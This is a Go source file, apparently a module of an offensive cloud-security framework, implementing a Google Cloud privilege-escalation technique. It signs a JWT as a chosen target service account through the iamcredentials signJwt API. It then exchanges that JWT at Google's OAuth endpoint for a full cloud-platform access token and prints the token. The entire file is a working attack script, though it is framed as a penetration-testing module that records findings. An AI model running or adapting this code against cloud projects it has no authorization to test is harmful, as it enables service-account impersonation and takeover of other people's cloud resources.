package iam

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"

	iamcredentials "google.golang.org/api/iamcredentials/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateSignJwt{})
}

// EscalateSignJwt uses signJwt to sign a JWT directly, then exchanges it for an access token.
type EscalateSignJwt struct{}

func (m *EscalateSignJwt) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-sign-jwt",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Sign a JWT via signJwt and exchange it for an access token",
		RequiresAuth: true,
	}
}

func (m *EscalateSignJwt) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	if targetSA == "" {
		output.Warn("Usage: run privesc.iam.escalate-sign-jwt --target-sa <service-account-email>")
		output.Info("Tip: run 'recon.iam.list-principals' first to discover service accounts.")
		return nil
	}

	svc, err := iamcredentials.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create iamcredentials client: %w", err)
	}

	now := time.Now()
	iat := now.Unix()
	exp := now.Add(time.Hour).Unix()

	payload := fmt.Sprintf(
		`{"iss":"%s","sub":"%s","aud":"https://oauth2.googleapis.com/token","iat":%d,"exp":%d,"scope":"https://www.googleapis.com/auth/cloud-platform"}`,
		targetSA, targetSA, iat, exp,
	)

	output.Info("Signing JWT via iamcredentials.signJwt for %s", targetSA)

	signResp, err := svc.Projects.ServiceAccounts.SignJwt(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamcredentials.SignJwtRequest{
			Payload: payload,
		},
	).Do()
	if err != nil {
		return fmt.Errorf("signJwt failed: %w", err)
	}

	signedJWT := signResp.SignedJwt

	output.Info("Exchanging signed JWT for access token")

	tokenResp, err := http.PostForm("https://oauth2.googleapis.com/token", url.Values{
		"grant_type": {"urn:ietf:params:oauth:grant-type:jwt-bearer"},
		"assertion":  {signedJWT},
	})
	if err != nil {
		return fmt.Errorf("token exchange request failed: %w", err)
	}
	defer tokenResp.Body.Close()

	body, err := io.ReadAll(tokenResp.Body)
	if err != nil {
		return fmt.Errorf("read token response: %w", err)
	}

	if tokenResp.StatusCode != http.StatusOK {
		return fmt.Errorf("token exchange failed (HTTP %d): %s", tokenResp.StatusCode, string(body))
	}

	output.Success("Access token obtained for %s via signJwt", targetSA)

	if ctx.Verbose {
		fmt.Printf("\n  Token Response: %s\n\n", string(body))
	} else {
		preview := string(body)
		if len(preview) > 80 {
			preview = preview[:80] + "..."
		}
		output.Info("Response: %s", preview)
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-sign-jwt",
			Severity:    module.SevCritical,
			Title:       "Obtained access token via signJwt",
			Description: fmt.Sprintf("Signed a JWT as %s using signJwt and exchanged it for an access token", targetSA),
			Resource:    targetSA,
		}
	}

	return nil
}
